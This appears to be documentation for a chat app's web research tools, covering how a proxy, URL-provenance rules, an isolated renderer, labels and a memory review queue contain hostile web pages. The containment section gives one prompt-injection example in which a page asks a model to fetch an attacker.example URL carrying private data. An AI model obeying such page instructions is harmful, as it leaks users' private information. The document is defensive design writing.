# Web research: the tools and what contains them

Crossband's models can search the web, read pages, and view rendered
pages. A public web page is attacker-controlled input by definition.
This page explains the tools, the machinery that contains them, and the
limits of that machinery. The knobs live in [CONFIG.md](CONFIG.md)
under "Research tool caps"; this page explains what they govern.

## The tools

- `web_search`: queries the configured engines (Tavily, Brave, or both)
  and returns labelled results. Needs at least one search key.
- `fetch_page`: downloads one page and returns its readable text. No
  scripts run. The cheap, first-choice reader.
- `view_page`: renders one page in a real browser and returns the
  visible text plus its links, numbered. For pages that scripts build.
  Offered only when rendering is installed (below).
- `fetch_youtube_transcript`, `transcribe_audio_url` and
  `fetch_reddit_thread`: transcripts and threads from their fixed
  services.

Every call and its result is persisted in the chat, visible to you and
to every model in the room.

## The containment model

The design starts from one assumption: a fetched page may be hostile.
Five mechanisms stand between a hostile page and this machine.

1. **One vetted exit.** Every URL a model can influence leaves through
   a local proxy the app owns. The proxy resolves a host once, requires
   every answer to be a public internet address, and connects to the
   exact address it checked. A site that changes its DNS answer between
   the check and the fetch reaches nothing new. Local services, private
   networks and this machine are unreachable by construction.
2. **No invented URLs.** A model may only fetch a URL that already
   exists in the chat from a non-model source: your messages, search
   results, links inside an already-fetched page, transcripts, text
   attachments, machine notices. A hostile page can ask a model to
   fetch `https://attacker.example/?q=<something private>`. The model
   cannot comply, because it cannot author a fetchable URL. A
   page-authored link is admissible: it can only carry page-authored
   data.
3. **An isolated renderer.** `view_page` runs the browser in a separate
   worker process that holds no keys and no tokens. All of its traffic
   goes through the proxy, scripts and frames included. WebRTC's proxy
   bypass is disabled. Downloads are refused. Each view gets a
   throwaway browser profile, deleted afterwards. A hard deadline kills
   the worker.
4. **Marked provenance.** Fetched and rendered content arrives labelled
   as untrusted quoted data, naming its domain. Every model in the room
   sees the same label.
5. **A memory hold.** A round that read the web stamps its replies with
   the source domains. Facts mined or saved from those turns wait in
   the memory service's review queue, grouped as "Learnt from a web
   page", until you decide. A page cannot write your memory by phrasing
   a sentence well.

## Turning rendering on

`web_search` and `fetch_page` need no install beyond their keys.
Rendering needs one more step:

```sh
.venv/bin/playwright install chromium   # ~160MB, once
```

Without it `view_page` is not offered and nothing else changes. The
tool also stands down whenever the egress proxy is not running: a
renderer never gets a network path that skips the vetting.

## When a fetch is refused

A refusal is always explicit and says what to do instead. The common
one is the URL rule: the model is told to search first, or to ask you
to paste the link. Pasting a URL into the chat makes it fetchable.

Some sites gate automated readers behind a human-verification check.
The reader does not solve those, by design. The models fall back to
asking you for the content; pasting it into the chat is the supported
path for gated sources.

## Limitations

- Sites you fetch see this machine's public address, like any browser.
- Human-verification challenges, paywalls and login walls stay closed.
- Search queries reach the configured search engines.
- A model choosing among known links reveals which link it chose.
- One page per call, on request. There is no crawling.
- Logged-in browsing does not exist. No cookies or credentials are ever
  sent, and no page can ask for them.
- The rendering worker is a separate process, not an OS-level sandbox.
- A rendered page load also carries a whole-page transfer budget
  (`browse_page_budget_mb`, 30MB); plain fetches keep per-connection
  caps only.
- The transcript shows rendered text, not a screenshot.
- The provenance label informs the models; it cannot force them. A
  page's text is still input a model may act on.
